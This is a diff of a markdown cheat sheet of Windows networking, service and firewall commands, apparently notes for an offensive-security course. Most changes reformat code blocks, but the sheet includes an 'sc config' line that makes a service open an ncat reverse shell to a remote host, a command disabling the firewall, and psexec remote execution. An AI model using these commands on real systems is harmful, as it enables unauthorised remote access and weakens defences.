@@ -30,7 +30,7 @@ https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol
 
 Show system information of local and remote computers
 
-```
+```shell
 systeminfo
 systeminfo /s remote /u user\domain /p password
 ```
@@ -47,7 +47,7 @@ Search environment variable starting with the letter k.
 
 `set k`
 
-```
+```shell
 echo %USERNAME%
 set Username
 powershell Get-ChildItem env:
@@ -58,7 +58,7 @@ setx /s remote /u user\domain /p password permant "dummy" /m
 setx TZONE /k HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\StandardName
 ```
 
-https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setx
+Permanent environment variables`https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setx`
 
 * /s remote server
 * /u user
@@ -68,7 +68,7 @@ https://learn.microsoft.com/en-us/windows-server/administration/windows-commands
 
 Query or renew IP and display or flush DNS
 
-```
+```shell
 ipconfig /release "ETH Adapter Name"
 ipconfig /renew "ETH Adapter Name"
 ipconfig /displaydns
@@ -83,20 +83,18 @@ The tool nslookup and the hosts file are the resources for name resolution
 * DNS uses udp/tcp 53
 * NetBios over tcp/ip uses udp/tcp 137, udp 138, tcp 139
 
-More about NBT 
+More about NBT on `https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nbtstat`
 
-https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nbtstat
-
-```
+```shell
 nbtstat /n
 nbtstat /c
 ```
 
 NSLookup tools
 
-```
+```shell
 nslookup
-> set all
+set all
 nslookup www.google.com
 %SystemRoot%\System32\drivers\etc\hosts
 ```
@@ -108,8 +106,8 @@ Netstat network status
 * -o processes id
 * -p protocol TCP,UDP,IP,ICMP, ...
 
-```
->netstat -p TCP -ano
+```shell
+netstat -p TCP -ano
 ```
 
 ARP views and manipulate ARP entries
@@ -118,8 +116,7 @@ ARP views and manipulate ARP entries
 * -s add static entries
 * -d delete entries
 
-
-```
+```shell
 arp /a 10.0.0.80
 arp /s 10.0.0.80 00-AA-00-4F-2A-9C
 arp /d 10.0.0.80
@@ -129,7 +126,7 @@ Using route, ping, tracert, pathping
 
 *Pathping* works in a very similar fashion, but once it confirms a hop, it will send multiple messages and provide the statistics. Because of that, pathping can be a little more reliable when compared to tracert to provide latency information.
 
-```
+```shell
 route print
 route add 1.1.1.1/32
 route -p add 1.1.1.2/32 192.168.207.254
@@ -138,8 +135,8 @@ tracert www.offsec.com
 pathping www.offsec.com
 ```
 
-https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pathping
-https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tracert
+`https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pathping`
+`https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tracert`
 
 * tracert /d  ... do NOT resolve IP addresses
 * pathping /n ... do NOT resolve IP addresses
@@ -163,13 +160,12 @@ SMB is a network sharing protocol on Windows which known to be very vulnerable t
 * Linux tools that support SMB are , moSMB, nq
 * Exploits combination for RCE using SMBGhost (CVE-2020-0796) and SMBleed (CVE-2020-1206)
 
-
 Net share and use allow to create/delete shares add/remove drives from machines on the network 
 
 * /user:user@domain <password>
 * /permanent:yes
 
-```
+```shell
 net share
 net share mySharedData=C:\Windows\system32
 net use \\192.168.1.1\public
@@ -215,7 +211,7 @@ psexec.exe -i -s \\IP -u admin -p password cmd /c "type c:\Users\admin\Desktop\f
 
 Unzip files
 
-```
+```shell
 tar -vxf file.zip
 psexec.exe -i \\IP -u user -p password cmd /c "tar -vxf file.zip"
 ```
@@ -235,11 +231,11 @@ AdvFirewall commands - https://learn.microsoft.com/en-us/previous-versions/windo
 
 Reset the firewall
 
-```
+```shell
 netsh firewall ?
 netsh advfirewall ?
 netsh advfirewall reset
-%systemroot%\system32\LogFiles\Firewall\pfirewall.log
+type %systemroot%\system32\LogFiles\Firewall\pfirewall.log
 ```
 
 Show all profiles and activate firewall
@@ -250,16 +246,21 @@ Show all profiles and activate firewall
 * privateprofile
 * publicprofile
 
-```
+```shell
+Get-NetFirewallProfile
+set-netfirewallprofile -name Public -Enabled False
+
+# non-powershell
 netsh advfirewall show allprofiles
 netsh advfirewall show allprofile state
 netsh advfirewall set allprofiles state on
+type %systemroot%\system32\LogFiles\Firewall\pfirewall.log
 
 ```
 
 Add rules to firewall
 
-```
+```shell
 netsh advfirewall firewall add rule name="Deny Ping OffSec" dir=in action=block protocol=icmpv4 remoteip=192.124.249.5
 netsh advfirewall firewall show rule name="Deny Ping OffSec"
 netsh advfirewall firewall delete rule name="Deny Ping OffSec"
@@ -269,7 +270,7 @@ netsh advfirewall firewall add rule name="Allow SSH" dir=in action="allow" local
 
 Export and import firewall policies
 
-```
+```shell
 netsh advfirewall export c:\fwPolicy.wfw
 netsh advfirewall reset
 netsh advfirewall import c:\fwPolicy.wfw
@@ -283,19 +284,20 @@ https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-serve
 
 Start/Stop and query services status info
 
-```
+```shell
 net stop WSearch
 net start WSearch
-new view WSearch
+net view WSearch
 
 sc start WSearch
 sc stop WSearch
+sc qc WSearch
 sc query WSearch
 sc description WSearch
 sc getdisplayname WSearch
 ```
 
-Show services information 
+Show services information
 
 https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist
 https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
@@ -309,12 +311,12 @@ https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
   * -p password
   * start/stop/query/config
 
-```
+```shell
 tasklist /svc
 tasklist /svc | find "Dhcp"
 
-sc query Dhcp  
 sc qc Dhcp
+sc query Dhcp
 PsService.exe start WSearch
 PsService.exe stop WSearch
 PsService.exe query WSearch
@@ -324,7 +326,7 @@ PsService setconfig "SNMPTRAP" auto/disabled
 
 Interact with services and create new ones
 
-```
+```shell
 sc config Dhcp start=auto
 sc config Dhcp start=disabled
 sc config Dhcp binPath= "ncat.exe 192.168.1.1 4444 -e cmd.exe"-
@@ -334,23 +336,20 @@ sc start test
 
 ## Remote Desktop
 
-Allow remote desktop connection from windows and linux.
-
-https://en.wikipedia.org/wiki/Remote_Desktop_Protocol
+Allow remote desktop connection from windows and linux. See also `https://en.wikipedia.org/wiki/Remote_Desktop_Protocol`
 
 * RDP uses TCP port 3389
 * -u user
 * -p password
-* -d user domain 
+* -d user domain
 
-```
+```powershell
 rdesktop -u offensive -p security 192.168.192.64
 ```
 
 Get Hostnames
 
-```
-
+```shell
 nslookup IP
 nbtstat -A IP
 nmap -v -A IP
